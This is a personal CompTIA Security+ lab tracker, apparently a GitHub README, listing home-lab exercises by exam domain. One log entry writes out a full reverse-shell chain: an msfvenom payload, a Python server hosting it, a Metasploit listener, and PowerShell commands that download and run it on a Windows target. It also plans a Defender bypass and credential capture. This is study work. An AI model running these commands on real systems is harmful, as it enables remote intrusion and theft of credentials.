# 📊 CompTIA Security+ Lab Tracker (SY0-701)

This tracker maps hands-on labs in my home cybersecurity lab to the CompTIA Security+ objectives. Each section links to lab documentation and tools used.

---

## Domain 1: Attacks, Threats, and Vulnerabilities

| Lab | Status | Link |
|-----|--------|------|
| Network Reconnaissance | ✅ Complete | [nmap-scan.md](./recon_logs/nmap-scan.md)
| Exploiting CVE via Metasploit | ✅ Complete | [metasploit-cve.md](./exploitation/metasploit-cve.md)
# SECURITY+ LAB TRACKER

## Phase 1 – Exploitation

### April 21–22, 2025 — Reverse Shell Attempt via PowerShell + Evil-WinRM

**Objective:** Gain reverse shell access to the Windows Server 2025 target (192.168.1.2) from Kali Linux attacker (192.168.1.3).

**Summary:**

- Used `msfvenom` to generate a reverse shell payload:
  ```bash
  msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.3 LPORT=4444 -f exe -o revshell.exe
  ```
- Hosted payload with Python HTTP server:
  ```bash
  sudo python3 -m http.server 80
  ```
- Set up Metasploit listener:
  ```bash
  use exploit/multi/handler
  set PAYLOAD windows/x64/shell_reverse_tcp
  set LHOST 192.168.1.3
  set LPORT 4444
  run
  ```
- Transferred and attempted to execute payload on Windows Server via PowerShell:
  ```powershell
  Invoke-WebRequest -Uri http://192.168.1.3/revshell.exe -OutFile C:\Users\Public\revshell.exe
  Start-Process C:\Users\Public\revshell.exe
  ```
- **Blocked by Defender**: Execution blocked due to Defender identifying `revshell.exe` as a threat.

**Outcome:** Reverse shell payload delivery succeeded; execution was blocked by Windows Defender. Target is aware of potential threats but lacks enhanced hardening.

**Next Steps:**

- Bypass Defender via encoding/obfuscation
- Explore WMI or scheduled task payload execution
- Capture more credentials using CrackMapExec or responder-based attacks

**📄 Report:** https://github.com/olehstudycyber/Oleh-Borysovskyy/commit/fca4d4eea008af0366f47c7b22ca1d92dbc297bc


---

## Domain 2: Architecture and Design

| Lab | Status | Link |
|-----|--------|------|
| Risk Assessment & Documentation | ✅ Complete | [risk-assessment.md](./reports/risk-assessment.md)

---

## Domain 3: Implementation

| Lab | Status | Link |
|-----|--------|------|
| Active Directory Setup | ✅ Complete | [PHYSICAL_LAB.md](./PHYSICAL_LAB.md)
| Group Policy Object (GPO) Configuration | ✅ Complete | Coming soon

---

## Domain 4: Operations and Incident Response

| Lab | Status | Link |
|-----|--------|------|
| Sysmon & Windows Defender Detection | ✅ Complete | [sysmon-analysis.md](./post_exploitation/sysmon-analysis.md)
| SIEM Setup (Wazuh) | 🚧 In Progress | Coming soon

---

## Domain 5: Governance, Risk, and Compliance

| Lab | Status | Link |
|-----|--------|------|
| Windows Server Hardening | ✅ Complete | [BUILD_SERVER.md](./BUILD_SERVER.md)

---

## ✅ To-Do List

- [ ] Set up Wazuh SIEM on separate Linux machine
- [ ] Simulate brute-force and phishing attacks
- [ ] Analyze traffic using Wireshark
- [ ] Upload screenshots and logs from labs

---

> ⚠️ All labs are performed in a secure, isolated lab environment for learning and demonstration purposes only.

Happy hacking! 💻🔐

---

> Created for personal Security+ lab prep by [Your Name] – GitHub: [yourusername]

